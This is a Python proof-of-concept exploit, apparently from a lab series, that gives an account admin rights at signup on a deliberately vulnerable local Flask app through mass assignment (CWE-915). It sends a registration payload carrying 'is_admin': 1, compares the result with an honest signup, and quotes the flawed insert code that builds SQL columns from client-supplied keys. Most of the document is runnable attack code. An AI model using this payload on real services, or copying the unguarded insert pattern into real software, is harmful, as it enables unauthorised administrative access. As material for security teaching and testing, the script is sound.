"""
Attack #2 — MASS ASSIGNMENT / PRIVILEGE ESCALATION AT SIGNUP  (CWE-915)
Target: POST /register on the vulnerable Flask app (http://127.0.0.1:5000)

Premise
-------
/register trusts the client JSON wholesale:

    cols = ", ".join(data.keys())
    _conn.execute(f"INSERT INTO users ({cols}) VALUES (...)", data.values())

There is no allowlist of which fields a signup may set. The `is_admin`
column is therefore client-settable. Anyone who adds "is_admin": 1 to the
registration payload creates an ADMINISTRATOR account for themselves — no
approval, no verification, no existing privilege required.

What this script proves
-----------------------
It registers two accounts against a fresh instance:
    1. an honest signup (no is_admin field)      -> normal user
    2. a malicious signup with "is_admin": 1      -> admin user
then logs into both and reads back the is_admin flag the server assigned.
The malicious account comes back is_admin=true: full privilege escalation
from an unauthenticated signup request.

Runs unmodified against a fresh instance.
"""

import requests

BASE = "http://127.0.0.1:5000"


def register(payload):
    return requests.post(f"{BASE}/register", json=payload)


def login(email, password):
    return requests.post(f"{BASE}/login", json={"email": email, "password": password})


def main():
    print("=" * 68)
    print("ATTACK #2 - Mass assignment: self-grant admin at signup")
    print("Target:", BASE)
    print("=" * 68)

    # --- Control: an honest registration, no privilege fields -------------
    honest = {"username": "honest_user", "email": "honest@demo.example", "password": "pw1"}
    r = register(honest)
    print(f"\n[*] Honest signup   -> HTTP {r.status_code}: {r.text.strip()}")

    # --- Attack: same shape, plus the forbidden field ---------------------
    evil = {
        "username": "mallory",
        "email": "mallory@evil.example",
        "password": "pw2",
        "is_admin": 1,          # <-- the whole attack is this one extra key
    }
    r = register(evil)
    print(f"[*] Malicious signup-> HTTP {r.status_code}: {r.text.strip()}")
    print("    (payload carried \"is_admin\": 1)")

    # --- Read back what the server actually granted -----------------------
    lh = login(honest["email"], honest["password"]).json()
    lm = login(evil["email"], evil["password"]).json()

    print("\n[*] Logging in to read the server-assigned privilege level:")
    print(f"    honest_user is_admin = {lh.get('is_admin')}")
    print(f"    mallory     is_admin = {lm.get('is_admin')}")

    print("\n" + "-" * 68)
    if lm.get("is_admin") is True and lh.get("is_admin") is False:
        print("[+] ATTACKER GAIN - unauthenticated signup produced an ADMIN account.")
        print("    The honest account is a normal user; only the payload differed.")
        print("    Privilege escalation with zero prior access. (CWE-915)")
    else:
        print("[-] Escalation did NOT occur - target does not appear vulnerable.")
    print("-" * 68)


if __name__ == "__main__":
    main()
